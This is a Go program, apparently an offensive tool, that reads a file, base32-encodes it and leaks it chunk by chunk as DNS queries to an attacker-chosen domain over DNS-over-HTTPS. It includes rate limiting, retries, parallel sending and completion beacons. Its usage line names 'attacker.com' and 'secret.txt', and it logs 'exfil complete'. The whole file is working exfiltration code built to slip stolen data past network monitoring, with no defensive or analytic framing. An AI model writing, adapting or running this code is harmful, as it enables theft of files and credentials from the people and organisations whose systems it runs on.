package main

import (
	"bytes"
	"context"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

func readAll(path string) ([]byte, error) {
	if path == "-" {
		return io.ReadAll(os.Stdin)
	}
	return os.ReadFile(path)
}

func chunkByBytes(s string, size int) []string {
	if size <= 0 {
		return []string{s}
	}
	var out []string
	b := []byte(s)
	for i := 0; i < len(b); i += size {
		j := i + size
		if j > len(b) {
			j = len(b)
		}
		out = append(out, string(b[i:j]))
	}
	return out
}

func clampLabel(sz int) int {
	if sz < 1 {
		return 1
	}
	if sz > 63 {
		return 63
	}
	return sz
}

func fqdnOK(name string) bool {
	return len(name) <= 255
}

func exponentialSleep(attempt int) {
	if attempt <= 0 {
		time.Sleep(100 * time.Millisecond)
		return
	}
	sleep := time.Duration(100*(1<<uint(attempt))) * time.Millisecond
	if sleep > 10*time.Second {
		sleep = 10 * time.Second
	}
	time.Sleep(sleep)
}

func dohQuery(client *http.Client, dohURL string, msg *dns.Msg, timeout time.Duration) error {
	wire, err := msg.Pack()
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "POST", dohURL, bytes.NewReader(wire))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/dns-message")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("doh status %d", resp.StatusCode)
	}
	_, _ = io.ReadAll(resp.Body)
	return nil
}

func makeAQuery(name string) *dns.Msg {
	m := new(dns.Msg)
	m.Id = dns.Id()
	m.RecursionDesired = true
	m.Question = []dns.Question{{Name: dns.Fqdn(name), Qtype: dns.TypeA, Qclass: dns.ClassINET}}
	return m
}

func main() {
	domain := flag.String("domain", "", "")
	file := flag.String("file", "", "")
	session := flag.String("session", fmt.Sprintf("%d", time.Now().Unix()), "")
	rate := flag.Int("rate", 60, "")
	labelSize := flag.Int("label", 50, "")
	retries := flag.Int("retries", 3, "")
	timeoutMs := flag.Int("timeout", 3000, "")
	parallel := flag.Int("parallel", 4, "")
	dohURL := flag.String("doh", "https://dns.google/dns-query", "")
	verbose := flag.Bool("v", false, "")
	dry := flag.Bool("dry-run", false, "")
	flag.Parse()

	if *domain == "" || *file == "" {
		fmt.Fprintln(os.Stderr, "usage: -domain attacker.com -file secret.txt ...")
		os.Exit(2)
	}

	if *rate < 1 {
		*rate = 1
	}
	if *rate > 600 {
		*rate = 600
	}
	*labelSize = clampLabel(*labelSize)
	if *parallel < 1 {
		*parallel = 1
	}

	data, err := readAll(*file)
	if err != nil {
		log.Fatalf("read error: %v", err)
	}

	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	enc = strings.ToLower(enc)
	labels := chunkByBytes(enc, *labelSize)
	total := len(labels)

	interval := time.Minute / time.Duration(*rate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}

	client := &http.Client{Timeout: time.Duration(*timeoutMs) * time.Millisecond}
	sem := make(chan struct{}, *parallel)
	var wg sync.WaitGroup
	var mu sync.Mutex
	failed := 0

	for i, lbl := range labels {
		seq := i + 1
		seqLabel := fmt.Sprintf("%d", seq)
		l := strings.ToLower(lbl)
		name := fmt.Sprintf("%s.%s.%s.%s", seqLabel, l, *session, *domain)
		if !fqdnOK(name) {
			log.Fatalf("fqdn too long %d", len(name))
		}
		if *dry {
			if *verbose {
				log.Printf("[dry] %s", name)
			}
			time.Sleep(interval)
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(name string, seq int) {
			defer wg.Done()
			defer func() { <-sem }()
			success := false
			for r := 0; r < *retries; r++ {
				msg := makeAQuery(name)
				err := dohQuery(client, *dohURL, msg, time.Duration(*timeoutMs)*time.Millisecond)
				if err == nil {
					success = true
					break
				}
				exponentialSleep(r)
			}
			if !success {
				mu.Lock()
				failed++
				mu.Unlock()
				if *verbose {
					log.Printf("failed label %s", name)
				}
			} else {
				if *verbose {
					log.Printf("sent %d/%d", seq, total)
				}
			}
		}(name, seq)
		time.Sleep(interval)
	}

	wg.Wait()

	doneName := fmt.Sprintf("done.%s.%s", *session, *domain)
	if !*dry {
		_ = dohQuery(client, *dohURL, makeAQuery(doneName), time.Duration(*timeoutMs)*time.Millisecond)
		cleanupName := fmt.Sprintf("cleanup.%s.%s", *session, *domain)
		_ = dohQuery(client, *dohURL, makeAQuery(cleanupName), time.Duration(*timeoutMs)*time.Millisecond)
	}

	if failed > 0 {
		log.Fatalf("finished with %d failed labels", failed)
	}
	log.Println("exfil complete")
}
